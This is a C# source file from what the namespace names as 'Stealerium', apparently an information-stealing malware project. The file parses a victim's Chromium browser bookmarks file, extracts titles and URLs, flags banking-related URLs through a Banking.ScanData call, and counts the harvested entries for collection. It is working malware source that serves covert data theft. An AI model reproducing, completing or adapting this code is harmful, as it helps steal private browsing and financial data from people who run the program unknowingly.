using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using Stealerium.Helpers;

namespace Stealerium.Target.Browsers.Chromium
{
    internal sealed class Parser
    {
        public static string Separator = "\": \"";

        public static string RemoveLatest(string data)
        {
            return Regex.Split(Regex.Split(data, "\",")[0], "\"")[0];
        }

        public static bool DetectTitle(string data)
        {
            return data.Contains("\"name");
        }

        public static string Get(string data, int index)
        {
            try
            {
                return RemoveLatest(Regex.Split(data, Separator)[index]);
            }
            catch (IndexOutOfRangeException)
            {
                return "Failed to parse url";
            }
        }
    }

    internal sealed class Bookmarks
    {
        /// <summary>
        ///     Get bookmarks from chromium based browsers
        /// </summary>
        /// <param name="sBookmarks"></param>
        /// <returns>List with bookmarks</returns>
        public static List<Bookmark> Get(string sBookmarks)
        {
            var bBookmarks = new List<Bookmark>();
            try
            {
                if (!File.Exists(sBookmarks)) return bBookmarks;
                var data = File.ReadAllText(sBookmarks, Encoding.UTF8); // Load file content

                data = Regex.Split(data, "      \"bookmark_bar\": {")[1];
                data = Regex.Split(data, "      \"other\": {")[0];


                var payload = Regex.Split(data, "},");
                foreach (var parse in payload)
                    if (parse.Contains("\"name\": \"") &&
                        parse.Contains("\"type\": \"url\",") &&
                        parse.Contains("\"url\": \"http")
                       )
                    {
                        var index = 0;
                        foreach (var target in Regex.Split(parse, Parser.Separator))
                        {
                            index++;
                            var bBookmark = new Bookmark();
                            if (!Parser.DetectTitle(target)) continue;
                            bBookmark.Title = Parser.Get(parse, index);
                            bBookmark.Url = Parser.Get(parse, index + 2);

                            if (string.IsNullOrEmpty(bBookmark.Title))
                                continue;
                            if (string.IsNullOrEmpty(bBookmark.Url) || bBookmark.Url.Contains("Failed to parse url"))
                                continue;
                            // Analyze value
                            Banking.ScanData(bBookmark.Url);
                            Counter.Bookmarks++;
                            bBookmarks.Add(bBookmark);
                        }
                    }
            }
            catch (Exception ex)
            {
                Logging.Log("Chromium >> Failed collect bookmarks data\n" + ex);
            }

            return bBookmarks;
        }
    }
}